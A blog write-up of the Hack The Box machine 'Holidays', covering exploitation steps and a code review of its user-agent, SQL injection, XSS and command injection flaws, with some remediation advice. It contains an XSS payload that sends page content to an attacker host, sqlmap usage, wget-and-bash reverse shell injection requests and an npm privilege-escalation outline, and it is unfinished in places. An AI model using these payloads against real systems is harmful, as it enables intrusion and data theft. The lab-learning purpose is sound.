---
layout: post
title:  "Hack The Box - Holidays - Source Code Analysis"
date:   2021-10-17 13:00:10 +0200
tags: ["Hack The Box","OSWE"]
---

# Introduction
The hack the box machine "Holidays" is a hard machine which requires knowledge in the areas of user agent filtering, SQL injections, XSS filter evasion, command injection and NodeJS packages. In this post, we study the coding mistakes behind the vulnerabilites and how to remediate them. Spotting vulnerabilties through code reviews is a very useful skill when performing white-box penetration testing, hence why writeups like this one might be useful!

![HolidayCard](/assets/2021-10-17-HTB-Holidays-Source-Code-Analysis/card.png)

The next two sections provide an overview of the exploitation process followed by a code analysis to identify the vulnerabilites in the source code. Feel free to skip or skim the next section if you already know how to exploit this particular Hack The Box machine. 

# Overview of Exploitation
The first step

Capture login post request to http://10.10.10.25:8000/login in burp, change user-agent to “Linux” and press “copy to file” > linux.req              #Routing is different depending on user-agent
sqlmap -r linux.req --level=5 --risk=3 -T users --dump -threads 10
We get RickA:fdc8cd4cff2c19e0d1022e78481ddf36:nevergonnagiveyouup           (cracked with crackstation)
Log in to http://10.10.10.25:8000/login

genPayload.py
{% highlight python linenos %}
payload = """document.write('<script src="http://10.10.14.25/x.js"></script>')"""
nums = [str(ord(i)) for i in payload]
print('<img src="x/><script>eval(String.fromCharCode('+','.join(nums)+'));</script>">')
{% endhighlight %}

x.js
{% highlight Javascript linenos %}
req1 = new XMLHttpRequest();
req1.open("GET","http://localhost:8000/vac/8dd841ff-3f44-4f2b-9324-9a833e2c6b65",false);
req1.send();
req2 = new XMLHttpRequest();
req2.open("GET","http://10.10.14.25/leak?x="+btoa(req1.responseText),false);
req2.send();
{% endhighlight %}

Sudo python3 -m 80
python3 genPayload.py | xclip -selection clipboard
Post a comment with the clipboard content
Wait 1 minutes. Then, copy the base64 content from the web server output and put in x.b64
cat x.b64 | base64 -d > x.html
Get the cookie value from x.html    (connect.sid&#x3D;s%3A0c2b6ab0-2905-11ec-93c0-9b5646fb6973.5woc5mpM%2F9dn5RN9MmvdvDeOtDts1f423a6mkfALt70)
Add the cookie in the browser and go to http://10.10.10.25:8000/admin

sudo rlwrap nc -lvnp 443
nano rs
GET /admin/export?table=x%26wget+168431129/rs
GET /admin/export?table=x%26bash+rs

The privilege escalation can be performed by abusing sudo rights on npm. As can be seen by using `sudo -l`, we can install arbitrary NPM packages with root privileges. This could be dangerous as it is possible install an NPM package which runs code before the installation process begins. By x, it is possible to run arbitrary code. This can be done by creating a custom node package module. For this, we can use the template (rimrafall github) which contains a folder named "rimrafall" with a package.JSON file. We modify the package.json file to look as below and leave the index.js file as it is.


Note that preinstall is executed when we run npm install. In fact these scripts are executed:
https://docs.npmjs.com/cli/v7/using-npm/scripts#npm-install

(package.json)

Package.json 
https://docs.npmjs.com/cli/v7/configuring-npm/package-json#name


(index.js)

Next, we start a listner on a free port, in this example we chose port 9999.

sudo npm i rimrafall to attempt to install the custom node module as a root user, triggering the execution of our reverse shell payload.



# Code analysis
To get started with the code analysis, I started by downloading the code from the machine using the `SCP` command. More specifically, I downloaded the folder `/home/algernon/app`. After downloading the folder, I opened it in VSCode. This showed me the files which are visible in the image below. The folder had a file named "package.json" which stated that the main file was named "index.js". As such, this file became the starting point for the analysis.

![files](/assets/2021-10-17-HTB-Holidays-Source-Code-Analysis/files.png)

## User-Agent Filtering

The content of the project's `index.js` file is shown below. Here, the `waterfall` function is used to call multiple functions. One of these functions was the `setupApp` function(line x) which called the `appSetup` function whose code can be found in the file `/home/algernon/app/setup/app.js`. 
{% highlight Javascript linenos %}
var async = require('async');

var dbSetup = require('./setup/db');
var appSetup = require('./setup/app');
var routerSetup = require('./setup/router');
var serverSetup = require('./setup/server');
var xssSetup = require('./setup/xss');

var scope = { };

async.waterfall([
	function setupDb(callback) {
		dbSetup(function(err, db) {
			scope.db = db;
			return callback();
		});
	},
	function setupApp(callback) {
		appSetup(function(err, app, router) {
			scope.app = app;
			scope.router = router;
			return callback();
		});
	},
	function setupRouter(callback) {
		routerSetup(scope, callback);
	},
	function setupServer(callback) {
		serverSetup(scope, function(err, server) {
			scope.server = server;
			return callback();
		});
	},
	function setupXss(callback) {
		xssSetup(scope, callback);
	}
], function() {
	console.log('Server up');
});
{% endhighlight %}

The `app.js` file contained a function which defined an anonymous function that ensured that different HTTP responses was provided for different user-agents. More specifically, it used the NodeJS Module `express-useragent` and would not allow access to any web pages unless either `req.useragent.isDesktop` or `req.useragent.isMobile` were `True`. 
{% highlight Javascript linenos %}
[...]
var useragent = require('express-useragent');

module.exports = function(callback) {
  var app = express();
  var router = express.Router();

  app
    .use(compression())
    .use(useragent.express())
    .use(function(req, res, next) {
      if (req.useragent.isDesktop || req.useragent.isMobile) return next()

      res.status(404)
      return next('Cannot GET ' + req.path)
    })
[...]
    .use(router);
  return callback(null, app, router);
};
{% endhighlight %}

{% highlight Javascript linenos %}

{% endhighlight %}
The project also contained a folder named "Node_modules" which contained all NodeJS packages which it used. As such, there was another folder in this folder named "express-useragent" which corresponded to the `express-useragent` module.
By studying the `package.json` file of the `express-useragent` module, we find the line below which states that the main file of the module is `index.js`.

{% highlight Javascript linenos %}
"main": "./index.js",
{% endhighlight %}

The content of the `index.js` file of the `express-useragent` module is shown below.
{% highlight Javascript linenos %}
var usrg = require('./lib/express-useragent');
var UserAgent = usrg.UserAgent;
module.exports = new UserAgent();
module.exports.UserAgent = UserAgent;
module.exports.express = function () {
return function (req, res, next) {
    var source = req.headers['user-agent'] || '';
    if (req.headers['x-ucbrowser-ua']) {  //special case of UC Browser
        source = req.headers['x-ucbrowser-ua'];
    }
    var ua = new UserAgent();
    if (typeof source === 'undefined') {
        source = "unknown";
    }
    ua.Agent.source = source.replace(/^\s*/, '').replace(/\s*$/, '');
    ua.Agent.os = ua.getOS(ua.Agent.source);
    ua.Agent.platform = ua.getPlatform(ua.Agent.source);
    ua.Agent.browser = ua.getBrowser(ua.Agent.source);
    ua.Agent.version = ua.getBrowserVersion(ua.Agent.source);
    ua.testNginxGeoIP(req.headers);
    ua.testBot();
    ua.testMobile();
    ua.testAndroidTablet();
    ua.testTablet();
    ua.testCompatibilityMode();
    ua.testSilk();
    ua.testKindleFire();
    req.useragent = ua.Agent;
    if ('function' === typeof res.locals) {
        res.locals({useragent: ua.Agent});
    } else {
        res.locals.useragent = ua.Agent;
    }
    next();
  };
};
{% endhighlight %}

After searching through the functions from line x to x, it can be deduced that the only function which modfies the `isMobile` or `isDesktop` booleans is the `testMobile` function shown below. 
To pass the if statement in the source code seen earlier, we need either `isMobile` or `isDesktop` to be true. As such, we only need to match any of the `case` statements in any of the `switch` statements in the code. For example, if `ua.Agent.isChromeOs` is `True`, `isDesktop` will become `True` and we will get a `200 OK` from the web application when requesting the "/login" page. 
{% highlight Javascript linenos %}
this.testMobile = function testMobile() {
  var ua = this;
  switch (true) {
    case ua.Agent.isWindows:
    case ua.Agent.isLinux:
    case ua.Agent.isMac:
    case ua.Agent.isChromeOS:
      ua.Agent.isDesktop = true;
      break;
    case ua.Agent.isAndroid:
    case ua.Agent.isSamsung:
      ua.Agent.isMobile = true;
      ua.Agent.isDesktop = false;
      break;
    default:
  }
  switch (true) {
    case ua.Agent.isiPad:
    case ua.Agent.isiPod:
    case ua.Agent.isiPhone:
    case ua.Agent.isBada:
    case ua.Agent.isBlackberry:
    case ua.Agent.isAndroid:
    case ua.Agent.isWindowsPhone:
      ua.Agent.isMobile = true;
      ua.Agent.isDesktop = false;
      break;
    default:
  }
  if (/mobile/i.test(ua.Agent.source)) {
    ua.Agent.isMobile = true;
    ua.Agent.isDesktop = false;
  }
};
{% endhighlight %}
By further studying the package code, it is possible to notice the `getOS` function, shown below. This function sets the boolean properties which could be seen in the previous code block (`isWindows`, `isLinux`, `isMac` e.t.c), using regular expressions. 

{% highlight Javascript linenos %}
this.getOS = function (string) {
    switch (true) {
        case this._OS.WindowsVista.test(string):
            this.Agent.isWindows = true;
            return 'Windows Vista';
        case this._OS.Windows7.test(string):
            this.Agent.isWindows = true;
            return 'Windows 7';
{% endhighlight %}

At the top of the same file, we can see the definition of the `_OS` object. Part of this object is shown below. This object contains regular expressions which correspond to different operating systems. For example, one of the strings is `/cros/i` which corresponds to ChromeOS. 

{% highlight Javascript linenos %}
this._OS = {
  Windows10: /windows nt 10\.0/i,
  Windows81: /windows nt 6\.3/i,
  [...]
  ChromeOS: /cros/i,
};
{% endhighlight %}

This means that we should be able to send in a string with the content "cros" to set the `isDesktop` variable to `True` and reach the login page. We can validate this hypothesis by sending a request with a user agent set to "cros". The pictures below shows such a request and the corresponding response headers in burp. As can be seen at the top of the response, the status code is `200 OK`, meaning that we succesfully passed the User Agent filter.

![ua1](/assets/2021-10-17-HTB-Holidays-Source-Code-Analysis/ua1.png)

![ua2](/assets/2021-10-17-HTB-Holidays-Source-Code-Analysis/ua2.png)

As a final note, if this code was present in a real web application, the general recommendation would have been to not rely on the `User-Agent` header for access control since the `User-Agent` header is controllable by the end user.

## SQL Injection Vulnerability

The database is filled in the db.js file which is invoked from the index.js file.

{% highlight Javascript linenos %}
var db = new sqlite3.Database('hex.db');
{% endhighlight %}

{% highlight Javascript linenos %}
module.exports = function(callback) {
  async.waterfall([
    function(cb) {
      db.run('PRAGMA journal_mode = OFF;', cb);
    },
    function(cb) {
      db.run('SELECT * FROM users', function(err) {
        if (!err) return cb('Already setup');

        return cb();
      });
    },
{% endhighlight %}


The router.js file contains the code which is executed when a specific endpoint is queried. This code is configured from the index.js file.
{% highlight Javascript linenos %}
[...]
var routerSetup = require('./setup/router');
[...]
var scope = { };

async.waterfall([
[...]
	function setupRouter(callback) {
		routerSetup(scope, callback);
	},
[...]
]
[...]
);
{% endhighlight %}

Note line x, where the req.body.username parameter is placed into the query string. This query parameter is then sent to the the database by using the `scope.db.get` function at line x.

`SELECT id, username, password, active FROM users WHERE (active=1 AND (username = "[username]"))` where [username] is the username supplied in the body of the request

If we let [username] be `")) -- sleep(1)`, we can force a delay to verify that we have remote code execution on the machine. This works since the query becomes the query below. Note that any characters after the comment character `--` won't be interpreted as part of the query. At this point, data can be exfiltrated using blind SQLI attacks. TODO: Check

`SELECT id, username, password, active FROM users WHERE (active=1 AND (username = " ")) -- "))`

{% highlight Javascript linenos %}
module.exports = function(scope, callback) {
  [...]
  scope.router.post('/login', function(req, res) {
    if (req.body.username == 'admin' && req.body.password == 'myvoiceismypassport') {
      req.session.username = 'admin';
      req.session.admin = true;
      res.redirect('/admin');
    } else {
      var query = 'SELECT id, username, password, active FROM users WHERE (active=1 AND (username = "' + req.body.username +'"))';
      var queryStart = +new Date();

      scope.db.get(query, function(err, row) {
        var queryEnd = +new Date();
        var queryTime = queryEnd - queryStart;
        if (err) return res.render('login.hbs', { internalError: err, publicError: 'Error Occurred', query: query, queryTime: queryTime });
        if (!row) return res.render('login.hbs', { publicError: 'Invalid User', query: query, queryTime: queryTime });
        if (row.password == crypto.createHash('md5').update(req.body.password).digest('hex')) {
          req.session.username = row.username;
          res.redirect('/agent');
        } else {
          res.render('login.hbs', { username: row.username, publicError: 'Incorrect Password', query: query, queryTime: queryTime });
        }
      });
    }
  });
  [...]
};
{% endhighlight %}

To prevent SQL Injection vulnerabilities, the general recommendation is to use prepared statemnts. It is also, normally, strongly recommended to always filter user supplied input using a white list of allowed characters. 

## XSS Vulnerability
{% highlight Javascript linenos %}
var xss = require('xss');
var xssFilter = new xss.FilterXSS({
  whiteList: {
    img: ['src']
  },
  onTagAttr: function (tag, name, value, isWhiteAttr) {
    if (name === 'src' && isWhiteAttr) return name + '=' + value.replace(/["' ]/g, '') + '';
    return null;
  }
});
{% endhighlight %}

This issue is not so difficult to spot. Remediations should be to not exclude certain tags from a filtering mechanism. In addition, it is important to always apply HTML encoding before outputting special characters to the DOM.

router.js contains the code
{% highlight Javascript linenos %}
scope.router.get('/vac/:uuid', function(req, res) {
  if (!req.params.uuid) return res.redirect('/login');

  scope.db.all('SELECT bookings.*, notes.id AS note_id, notes.body AS note_body, notes.created AS note_created, notes.approved AS note_approved FROM bookings LEFT JOIN notes ON notes.booking_id = bookings.id WHERE bookings.uuid=? ORDER BY note_created ASC', [req.params.uuid], function(err, rows) {
    if (err || !rows || !rows.length) return res.redirect('/login');

    var transformedRows = rows.reduce(function(previous, current) {
      if (!previous[current.uuid]) {
        previous[current.uuid] = current;
        previous[current.uuid].notes = [ ];
      }

      if (current.note_body) {
        previous[current.uuid].notes.push({
          body: xssFilter.process(current.note_body, { onIgnoreTagAttr: function(tag, name, value, isWhiteAttr) { console.log(arguments); if (name === "src" && isWhiteAttr) { return value; } return null; } }),
          created: moment(current.note_created).format("dddd, MMMM Do YYYY, h:mm:ss a"),
          approved: current.note_approved,
          id: current.note_id
        });
      }

      return previous;
    }, { });
    var transformedRows2 = Object.keys(transformedRows).map(function(curKey) {
      if (!transformedRows[curKey].notes.length) delete transformedRows[curKey].notes;
      return transformedRows[curKey];
    });

    var row = transformedRows2[0];

    row.start = moment(row.start).format("dddd, MMMM Do YYYY, h:mm:ss a");
    row.end = moment(row.end).format("dddd, MMMM Do YYYY, h:mm:ss a");
    res.render('vac.hbs', { booking: row, username: req.session.username, admin: req.session.admin, cookie: req.headers.cookie });
  });
});
{% endhighlight %}

TODO: Removes spaces?

## Command Injection Vulnerability

The `scope.router.get` function is used to define an endpoint. In this particular case, line 1 states that the endpoint "/admin/exports" can be reached by get requests and that any such requests should be handled by the function which is defined on line 2 to 13.

The regex `/[^a-z0-9& \/]/g` matches everything that is not an alphanumeric character, the `&` character, the space character and the forward slash `/` character. Anything that is matched will be subsituted for the empty string `''`. In other words, any character outside of these characters, will be removed. In addition, the server will respond with a "500 Internal server error" error message. 

Once the characters have passed the filter, they go into x

`sqlite3 hex.db SELECT * FROM [userInput]` where [userInput] are the characters the user submitted. This assumes that all characters passed the white list

`sqlite3 hex.db SELECT * FROM table && sleep 2`

From file "./app/setup/router.js"
{% highlight Javascript linenos %}
scope.router.get('/admin/export', function(req, res) {
  console.log('Admin Export', req.query)
  if (!req.session.admin) return res.redirect('/login');
  var filteredTable = req.query.table.replace(/[^a-z0-9& \/]/g, '')
  if (filteredTable != req.query.table) return res.status(500).send('Invalid table name - only characters in the range of [a-z0-9&\\s\\/] are allowed');

  exec('sqlite3 hex.db SELECT\\ *\\ FROM\\ ' + filteredTable, function(err, stdout, stderr) {
    res.header('Cache-Control', 'private, no-cache, no-store, must-revalidate');
    res.header('Expires', '-1');
    res.header('Pragma', 'no-cache');
    res.attachment('export-' + req.query.table + '-' + (+new Date()));
    res.send(stdout);
  });
});
{% endhighlight %}

Definition of the `exec` function.

{% highlight Javascript linenos %}
var exec = require('child_process').exec;
{% endhighlight %}

<!---
# Furher Readingo
Checkout: automating hackthebox holidays
-->


